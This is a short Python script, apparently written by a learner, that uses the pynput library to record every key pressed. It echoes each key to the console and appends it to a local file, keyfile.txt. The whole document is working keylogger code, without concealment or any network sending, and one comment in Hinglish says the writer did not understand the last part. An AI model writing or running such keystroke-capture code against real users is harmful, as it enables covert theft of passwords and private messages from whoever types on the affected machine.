from pynput import keyboard

def keyPressed(key):
    print(str(key))  # Log the key press for visual feedback
    with open("keyfile.txt", 'a') as logKey:
        try:
            if hasattr(key, 'char') and key.char is not None:
                logKey.write(key.char)  # Log printable characters
            else:
                logKey.write(f'[{key}]')  # Log special keys in brackets
        except AttributeError as e:
            print(f"Error getting key: {e}")  # Provide more context in error handling

if __name__ == "__main__": #yaha se nhi samjha
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()  
    